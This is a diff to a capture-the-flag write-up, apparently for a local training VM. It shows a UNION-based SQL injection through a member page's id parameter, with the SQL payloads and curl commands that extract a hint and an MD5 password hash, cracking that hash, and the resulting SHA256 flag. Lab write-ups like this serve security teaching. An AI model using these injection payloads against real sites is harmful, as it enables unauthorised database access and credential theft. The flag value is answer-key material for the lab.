@@ -111,50 +111,34 @@ We use `-1` to ensure the first SELECT returns no results (negative IDs don't ex
 - `Commentaire` (French for "Comment")
 - `countersign` (Password)
 
-### Step 6: Extract Hint from Commentaire Column
+### Step 6: Extract Hint and Password Hash
 **Input**:
 ```sql
-1 UNION SELECT first_name, Commentaire FROM users
+1 UNION SELECT Commentaire, countersign FROM users
 ```
 
-![Extracting Commentaire (hint)](images/04-commentaire-hint.png)
+![Extracting Commentaire (hint) and countersign (password hash)](images/04-hint-and-password.png)
 
 **Result for Flag user**:
 ```
-First name: Flag
-Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-```
-
-**Instructions found**:
-1. Decrypt the password
-2. Convert to lowercase
-3. Apply SHA256 hashing
-
-### Step 7: Extract Encrypted Password
-**Input**:
-```sql
-1 UNION SELECT first_name, countersign FROM users
-```
-
-![Extracting countersign (password hash)](images/05-countersign-password.png)
-
-**Result for Flag user**:
-```
-First name: Flag
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
 
-The password is an MD5 hash (32 hexadecimal characters).
+**Instructions found**:
+1. Decrypt the password (MD5 hash: 32 hexadecimal characters)
+2. Convert to lowercase
+3. Apply SHA256 hashing
 
-### Step 8: Crack MD5 Hash
+### Step 7: Crack MD5 Hash
 Using [CrackStation.net](https://crackstation.net/):
 
-![MD5 hash cracking result](images/06-md5-crack.png)
+![MD5 hash cracking result](images/05-md5-crack.png)
 
 **Hash**: `5ff9d0165b4f92b14994e5c685cdce28`
 **Plaintext**: `FortyTwo`
 
-### Step 9: Generate Flag
+### Step 8: Generate Flag
 Following the instructions from the Commentaire:
 
 1. **Decrypt**: `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
@@ -165,7 +149,7 @@ Following the instructions from the Commentaire:
 echo -n "fortytwo" | shasum -a 256
 ```
 
-![SHA256 hash generation](images/07-sha256-flag.png)
+![SHA256 hash generation](images/06-sha256-flag.png)
 
 **Result**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
@@ -188,18 +172,15 @@ curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+database()%2C+
 # 4. Enumerate table structure
 curl "http://192.168.64.2/index.php?page=member&id=-1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit"
 
-# 5. Extract hint
-curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+first_name%2C+Commentaire+FROM+users&Submit=Submit"
+# 5. Extract hint and password hash (combined)
+curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+Commentaire%2C+countersign+FROM+users&Submit=Submit"
 
-# 6. Extract password hash
-curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+first_name%2C+countersign+FROM+users&Submit=Submit"
-
-# 7. Crack MD5 hash
+# 6. Crack MD5 hash
 # Visit: https://crackstation.net/
 # Input: 5ff9d0165b4f92b14994e5c685cdce28
 # Output: FortyTwo
 
-# 8. Generate SHA256 flag
+# 7. Generate SHA256 flag
 echo -n "fortytwo" | shasum -a 256
 # Output: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
